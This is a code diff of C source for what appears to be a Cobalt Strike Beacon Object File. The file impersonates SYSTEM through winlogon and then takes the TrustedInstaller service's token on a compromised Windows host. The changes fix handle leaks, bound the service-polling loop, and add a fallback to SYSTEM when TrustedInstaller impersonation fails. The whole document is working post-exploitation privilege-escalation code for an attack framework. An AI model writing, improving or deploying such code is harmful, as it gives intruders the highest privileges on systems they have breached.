@@ -15,6 +15,7 @@ WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR lpMachineName,LPCSTR l
 WINBASEAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
 WINBASEAPI WINBOOL WINAPI ADVAPI32$QueryServiceStatusEx(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
 WINBASEAPI WINBOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);
+WINADVAPI WINBOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE hSCObject);
 WINBASEAPI DWORD WINAPI KERNEL32$SleepEx(DWORD dwMilliseconds, WINBOOL bAlertable);
 
 int my_strcmp(const char *s1, const char *s2)
@@ -56,32 +57,34 @@ DWORD GetTrustedInstallerPID()
     }
 
     SC_HANDLE schService = ADVAPI32$OpenServiceA(schManager, "TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START);
-     if(schManager == NULL) {
+    if(schService == NULL) {
         BeaconPrintf(CALLBACK_OUTPUT, "OpenService failed. Error: %d\n", KERNEL32$GetLastError());
-        KERNEL32$CloseHandle(schManager);
-        return FALSE;
+        ADVAPI32$CloseServiceHandle(schManager);
+        return 0;
     }
-    KERNEL32$CloseHandle(schManager);
 
     SERVICE_STATUS_PROCESS ssp;
     DWORD dwSize = 0;
+    int tries = 0;
 
-    while(ADVAPI32$QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwSize)) {
+    while(tries++ < 12 && ADVAPI32$QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwSize)) {
         if(ssp.dwCurrentState == SERVICE_STOPPED) {
             if(!ADVAPI32$StartServiceA(schService, 0, NULL)) {
                 BeaconPrintf(CALLBACK_OUTPUT, "StartService failed. Error: %d\n", KERNEL32$GetLastError());
-                KERNEL32$CloseHandle(schService);
-                return FALSE;
+                ADVAPI32$CloseServiceHandle(schService);
+                ADVAPI32$CloseServiceHandle(schManager);
+                return 0;
             }
         }
         if(ssp.dwCurrentState == SERVICE_RUNNING) {
             PID = ssp.dwProcessId;
             break;
         }
-        KERNEL32$SleepEx(5000, FALSE);
+        KERNEL32$SleepEx(500, FALSE);
     }
 
-    KERNEL32$CloseHandle(schService);
+    ADVAPI32$CloseServiceHandle(schService);
+    ADVAPI32$CloseServiceHandle(schManager);
     return PID;
 }
 
@@ -147,20 +150,24 @@ BOOL ElevateTrustedInstaller(HANDLE *hTokenTrustedInstaller)
 
 void go(char *args, int len)
 {
-    formatp output;
-
     if(!BeaconIsAdmin()) {
         BeaconOutput(CALLBACK_ERROR, "The session must have administrator rights\n", 44);
         return;
     }
 
     HANDLE hTokenSystem = NULL;
-    if(!ElevateSystem(&hTokenSystem))
-      return;
+    if(!ElevateSystem(&hTokenSystem)) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to impersonate SYSTEM via winlogon\n");
+        return;
+    }
 
     HANDLE hTokenTrustedInstaller = NULL;
-    if(!ElevateTrustedInstaller(&hTokenTrustedInstaller))
-      return;
+    if(ElevateTrustedInstaller(&hTokenTrustedInstaller)) {
+        BeaconOutput(CALLBACK_OUTPUT, "Impersonate to SYSTEM & TrustedInstaller succeeded", 51);
+        return;
+    }
 
-    BeaconOutput(CALLBACK_OUTPUT, "Impersonate to SYSTEM & TrustedInstaller succeeded", 51);
+    /* SYSTEM token is already applied; TI is optional (CS getsystem does not require it). */
+    BeaconOutput(CALLBACK_OUTPUT, "Impersonate to SYSTEM succeeded", 32);
+    BeaconPrintf(CALLBACK_OUTPUT, "TrustedInstaller impersonation failed; SYSTEM token is still applied\n");
 }
